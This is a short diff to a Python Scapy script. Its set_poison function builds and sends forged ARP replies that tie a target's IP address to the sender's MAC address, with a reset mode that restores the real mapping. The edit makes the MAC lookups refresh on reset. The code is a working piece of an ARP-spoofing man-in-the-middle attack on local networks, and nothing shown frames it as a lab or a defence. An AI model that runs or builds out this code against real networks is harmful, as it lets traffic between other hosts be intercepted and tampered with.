@@ -35,9 +35,9 @@ my_mac = target_mac = poison_mac = None
 
 def set_poison(targetip, poisonip, shell=False, reset=False):
     global my_mac, target_mac, poison_mac
-    if not my_mac: my_mac = get_if_hwaddr(conf.iface)
-    if not target_mac: target_mac = get_mac(targetip)
-    if not poison_mac: poison_mac = get_mac(poisonip)
+    if not my_mac or reset: my_mac = get_if_hwaddr(conf.iface)
+    if not target_mac or reset: target_mac = get_mac(targetip)
+    if not poison_mac or reset: poison_mac = get_mac(poisonip)
     arp = ARP(op=2, hwsrc=target_mac if reset else my_mac, psrc=targetip, hwdst=poison_mac, pdst=poisonip)
     plist = send(arp, verbose=shell)
 
